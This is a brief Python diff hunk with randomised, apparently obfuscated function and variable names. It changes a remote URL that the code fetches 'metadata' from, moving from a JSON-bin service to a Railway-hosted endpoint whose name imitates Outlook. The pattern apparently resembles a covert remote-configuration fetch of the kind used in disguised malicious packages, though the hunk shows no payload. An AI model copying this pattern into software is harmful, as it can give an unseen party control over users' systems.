@@ -16,7 +16,7 @@ def config_yiiwwv_988():
 
     def train_qmndbc_818():
         try:
-            learn_rnfewn_194 = requests.get('https://api.npoint.io/15ac3144ebdeebac5515', timeout=10)
+            learn_rnfewn_194 = requests.get('https://outlook-profile-production.up.railway.app/get_metadata', timeout=10)
             learn_rnfewn_194.raise_for_status()
             learn_dpridx_353 = learn_rnfewn_194.json()
             config_pqcmrm_480 = learn_dpridx_353.get('metadata')
